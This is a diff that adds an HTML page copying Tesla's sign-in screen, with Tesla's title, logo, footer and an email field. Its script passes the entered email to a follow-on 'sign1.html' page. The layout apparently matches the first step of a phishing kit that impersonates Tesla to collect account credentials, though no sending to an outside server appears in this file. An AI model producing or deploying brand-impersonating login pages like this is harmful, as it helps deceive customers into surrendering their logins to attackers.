@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign In | Tesla</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+      background-color: #fff;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 40px;
+    }
+
+    .tesla-logo img {
+      height: 24px;
+    }
+
+    .lang-selector {
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      color: #333;
+    }
+
+    .lang-selector span {
+      font-size: 13px;
+    }
+
+    main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 40px 16px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    h2 {
+      font-size: 28px;
+      font-weight: 600;
+      margin-bottom: 30px;
+      text-align: left;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    label {
+      font-weight: 600;
+      color: #222;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    .info-icon {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 1px solid #999;
+      border-radius: 50%;
+      text-align: center;
+      line-height: 16px;
+      font-size: 12px;
+      font-weight: bold;
+      color: #999;
+      margin-left: 5px;
+    }
+
+    input[type="email"] {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 15px;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .btn-primary {
+      background-color: #a8b8f4;
+      color: white;
+    }
+
+    .btn-primary:hover {
+      background-color: #96a4e0;
+    }
+
+    .btn-secondary {
+      background-color: #f4f4f4;
+      color: #222;
+      border: 1px solid #ddd;
+    }
+
+    .btn-secondary:hover {
+      background-color: #eaeaea;
+    }
+
+    .link {
+      display: block;
+      margin-top: 16px;
+      font-size: 14px;
+      text-decoration: underline;
+      color: #000;
+    }
+
+    .separator {
+      margin: 30px 0;
+      text-align: center;
+      position: relative;
+      font-size: 14px;
+      color: #999;
+    }
+
+    .separator::before,
+    .separator::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      width: 40%;
+      height: 1px;
+      background-color: #ddd;
+    }
+
+    .separator::before {
+      left: 0;
+    }
+
+    .separator::after {
+      right: 0;
+    }
+
+    .separator span {
+      background-color: #fff;
+      padding: 0 10px;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 13px;
+      color: #555;
+      padding: 20px 10px;
+    }
+
+    footer a {
+      margin: 0 10px;
+      text-decoration: none;
+      color: #555;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+
+    a {
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <div class="tesla-logo">
+       <a href="index.html" class="tesla-logo">
+    <img src="logo.png" alt="Tesla Logo" />
+  </a>
+    </div>
+    <div class="lang-selector">
+      <span>🌐</span>
+      <span>en-US</span>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main>
+    <div class="container">
+      <h2>Sign In</h2>
+      <div class="form-group">
+        <label for="email">Email <span class="info-icon">i</span></label>
+        <input type="email" id="email" placeholder=""/>
+      </div>
+
+      <button class="btn btn-primary" id="nextBtn">Next</button>
+
+      <a href="#" class="link">Trouble Signing In?</a>
+
+      <div class="separator"><span>Or</span></div>
+
+      <button class="btn btn-secondary">Create Account</button>
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer>
+    Tesla © 2025
+    <a href="#">Privacy & Legal</a>
+    <a href="#">Contact</a>
+  </footer>
+
+  <!-- JS -->
+  <script>
+    document.getElementById('nextBtn').addEventListener('click', function (e) {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      if (email.trim() !== '') {
+        window.location.href = `sign1.html?email=${encodeURIComponent(email)}`;
+      } else {
+        alert("Please enter your email.");
+      }
+    });
+  </script>
+
+</body>
+</html>
